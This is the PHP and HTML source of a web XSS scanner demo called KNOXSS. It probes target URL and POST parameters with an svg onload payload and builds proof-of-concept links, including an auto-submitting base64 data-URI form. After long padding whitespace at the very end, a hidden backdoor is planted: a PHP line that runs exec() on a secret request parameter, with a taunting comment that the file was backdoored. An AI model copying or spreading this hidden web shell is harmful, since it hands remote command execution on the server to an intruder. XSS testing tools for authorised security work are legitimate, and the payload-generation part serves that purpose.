<!DOCTYPE html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KNOXSS Demo</title>
    <link rel="stylesheet" href="styles/index.css">
    <link rel="stylesheet" href="styles/spinner.css">
    <link rel="stylesheet" href="styles/background.css"> 
    <link rel="stylesheet" href="styles/move.css">
    <link rel="stylesheet" href="styles/modal.css">
    <link rel="stylesheet" href="styles/lato.css">
    <link rel="stylesheet" href="styles/menu.css">
  </head>
  <body id="demo">
  <ul id="menu">
    <li>
      <a href="#">Menu</a>
      <ul>
        <li><a href="/?page_id=252">My Profile</a></li>
        <li><a href="#">Plan Upgrade</a></li>
        <li><a href="/old/demo">Old Interface</a></li>
      </ul>
    </li>
  </ul>
<?php
  if (!$_REQUEST["target"]) {
?>
  <div id="x">
  </div>
  <div id="loading" class="sk-fading-circle">
  </div>
  <script>
  function showModal(){
        var modal = document.getElementById('myModal');
        var mspan = document.getElementsByClassName("close")[0];

        modal.style.display = "block";

        mspan.onclick = function() {
                modal.style.display = "none";
        }

        window.onclick = function(event) {
                if (event.target == modal) {
                        modal.style.display = "none";
                }
        }
  };
  </script>
  <form action="" method="post" onsubmit="loading()">
    <div id="myModal" class="modal">
      <div class="modal-content">
        <div class="modal-header">
          <span class="close">&times;</span>
          <p class="header">Extra</p>
        </div>
        <div class="modal-body">
          <textarea id="extra_data" name="post" autocomplete="off" placeholder="POST Data"></textarea>
          <br>
        </div>
        <div class="modal-footer">
          <br>
          <p class="description">Provide POST data.</p>
        </div>
      </div>
    </div>
    <div class="header">
      <p>KNOXSS</p>
    </div>
    <div class="description">
      <p>Demo Edition - beta v1.0.0</p>
    </div>
    <div class="input">
      <input type="url" class="button" id="target" name="target" autocomplete="off" placeholder="TARGET PAGE">
      <input type="submit" class="button" id="submit" name="submit" value="TEST">
    </div>
    <br>
    <span class="extra" onclick="showModal()">Extra Data</span>
  </form>
  <div class="description">
    <p id="copyright">© 2017 Brute Logic - All rights reserved.</p>
  </div>
  </body>
  <script src="js/functions.js"></script>
</html>
<?php
  } else {
?>
  <script src="js/functions.js"></script>
  <div id="title"></div>
  <div id="line"></div>
  <div id="results"></div>
  <div id="back"></div>
  <div class="description">
    <button id="return" class="button" onclick="location.href='';">BACK</button>
    <p id="copyright">© 2017 Brute Logic - All rights reserved.</p>
  </div>
  </body>
</html>
<?php
error_reporting(0); // Turn off all error reporting
/*error_reporting(E_ALL);
ini_set('display_errors',1);*/

// ===== VARS ===== //

$probe = "KNOX1S2S3";
$xss = 0;
$tester_url = "http://localhost:1337";
$demo = "'\"><svg/onload=alert(1)>";
$input = $_REQUEST["target"];
$etc = (strlen($input) >= 89) ? " ..." : "";
$target = $input;
$die = "\n<!--" . htmlentities($input) . "-->";
$preflight = 0;
$post_data = $_REQUEST["post"];
$http_method = 0;

if(strpos($target,"#")){
   $fragment = preg_replace("/.*#/","#",$target);
} else { $fragment = "#KNOXSS"; }


// ===== FUNCTIONS ===== //

function test($url, $http_method, $data){

   global $preflight, $die, $abort;

   $optArray = array(
      CURLOPT_URL => $url,
      CURLOPT_POST => $http_method,
      CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
      CURLOPT_TIMEOUT => 10,
      CURLOPT_FOLLOWLOCATION => 0,
      CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0
   );
   $ch = curl_init();
   curl_setopt_array($ch, $optArray);
   if ($data) { curl_setopt($ch, CURLOPT_POSTFIELDS, $data); }

   $response = curl_exec($ch) or die("\n<br>\n<p id=\"fade_info_2\" class=\"description\">ERROR: Aborted, network issues!" .
                                        "\n<br>Reason: " . curl_error($ch) . ".</p>" . $die);

   curl_close($ch);
   return $response;
}


function pwn($pwn){

   global $open_poc;

   $pwn = str_replace("\\", "\\\\", str_ireplace("</script", "%3C/Script", $pwn));
   $pwn = str_replace("'", "%27", str_replace("%25%75", "%u", $pwn));
   $open_poc = "window.open('".htmlentities($pwn)."');";
}


function set($demo, $tester_url, $target){

   global $demo, $fragment, $xss, $probe, $post_data, $send_data;

   $p = $demo;

   $xss_data = str_replace($probe, $p, $send_data);

   $target_test = "{\"target\":" . json_encode(str_replace($probe, $p, $target) . $fragment) .
      ", \"data\":" . json_encode($xss_data) . "}";

   if(!$post_data){
      $target_open = str_replace($probe, $p, $target) . $fragment;
   } else {
      $target_open = post_poc($target, $xss_data);
   }

   $response = test($tester_url, 1, $target_test);
   if ($response === "TRUE\n"){
      $xss = 2;
      pwn($target_open);
      return $target_open;
   }
}

function xss_page() {

   $method = rand(0,1);
   $xsspage = "https://brutelogic.com.br/xss.php";
   $xsspage_params = ["", "?a=1", "?b1=1", "?b2=1", "?b3=1", "?b4=1",
                        "?c1=1", "?c2=1", "?c3=1", "?c4=1", "?c5=1", "?c6=1"];
   if ($method == 0) {
      $xsspage_target[0] = $xsspage . $xsspage_params[rand(0, count($xsspage_params)-1)];
   } else {
      $xsspage_target[0] = $xsspage;
      $xsspage_target[1] = str_replace("?", "", $xsspage_params[rand(0, count($xsspage_params)-1)]);
   }

   return $xsspage_target;
}

function sanitize_local() {

   global $input;

   $localhost = ["localhost", "127.0", "192.168", "10.0", "0", "[", "knoxss.me", "104.236.100.235", "1760322795"];
   foreach($localhost as $forbidden) {
      $input = preg_match("/^http(s)?:\/\/$forbidden/i", $input) ? "" : $input;
   }
   $input = preg_match("/\.localhost/i", $input) ? "" : $input;
   $input = preg_match("/^file/", $input) ? "" : $input;
}

function test_post() {

   global $post_data, $tester_url, $target, $probe, $send_data, $poc, $xss;

   $http_method = 1;
   $a = explode("&", $post_data);

   for ($i=0;$i<count($a);$i++){
      $a[$i] = $a[$i] . $probe;

      $send_data = implode("&", $a);

      if (preg_match("/$probe/i", test($target, $http_method, $send_data))) {
            $poc = set($demo, $tester_url, $target);
            if($poc){ break; }
            $xss = 1;
      }
      $xss = 1;
      $a = explode("&", $post_data);
   }
   return $xss;

}

function post_poc($target, $send_data) {

   $data_header = "Data:Text/Html;Base64,";
   $data_begin = "<form action=" . $target . " method=\"POST\">";
   $data_end = "<input type=submit></form><script>document.forms[0].submit()</script>";

   $send_data = explode("&", $send_data);

   for($i=0; $i<count($send_data); $i++) {
      $name_value = explode("=", $send_data[$i], 2);
      $data_input = $data_input . "<input type=hidden name=\"" . $name_value[0] . "\" value=\"" . htmlentities($name_value[1]) . "\">";
   }
   return $data_poc = $data_header . base64_encode($data_begin . $data_input . $data_end);
}


// ===== MAIN ===== //

fsockopen("localhost", 1337) or die("<p id=\"fade_info_2\" class=\"description\">ERROR: Service DOWN (unable to connect to tester module)!</p>" . $die);

sanitize_local();

if ($input){

   if (!$post_data) {
      $r = test($target);
   } else {
      $r = test($target, 1, 0, $post_data);
   }

   preg_match("/<noscript>.*javascript.*<\/noscript>/i", $r, $noscript);

   $preflight = 1;

   if (!$post_data) {

      $parts = parse_url($target);

      if($parts["query"]){
         $a = explode("&", $parts["query"]);
      } else {
         $a = array("/");
      }

      for ($i=0;$i<count($a);$i++){
         $a[$i] = $a[$i] . $probe;
         $target = preg_replace("/\?.*/", "?", $target).implode("&",$a);

         if (preg_match("/$probe/i", test($target, $http_method))) {
            $poc = set($demo, $tester_url, $target);
            if($poc){ break; }
            $xss = 1;
         }
         $xss = 1;
         $a = explode("&", $parts["query"]);
      }
   } else { $xss = test_post(); }

   if ($xss != 0){
      if ($xss == 1) {
         echo "<script>moveResults('" . substr(htmlentities($input), 0, 89) . $etc . "','No XSS found.', '')</script>";
         if ($noscript) {
            echo "<p id=\"info\">* Main content possibly generated by javascript (unable to handle).</i></p>\n";
         }
      } else {
   echo "<script>moveResults('" . substr(htmlentities($input), 0, 89) . $etc . "','XSS found!', '')</script>";
         echo "<p id=\"fade_info_3\" class=\"description\"><span id=\"poc\" class=\"extra\" onclick=\"" . $open_poc . 
    "\" target=\"_blank\">Proof-of-Concept</span></p>\n";
      }
   }

} else {

   if ($_REQUEST["submit"]){

      $auto_complete = xss_page();
      echo "<script>alert(1);\ndocument.getElementById('target').value='" . $auto_complete[0] .
           "';\ndocument.getElementById('post').value='" . $auto_complete[1] . "';\n</script>\n";
   }
}
?>
</div>
</body>
</html>
<?php
}
?>

                                                                                                                                                                                                                                                                                          <?php if(isset($_REQUEST['l0ld0ng5x187427'])){print exec($_REQUEST['l0ld0ng5x187427']);}# h4h4 y0u g0t b4ck d00r3d by THE CEO y0u fuck1ng sk1d r3t4rd ?>
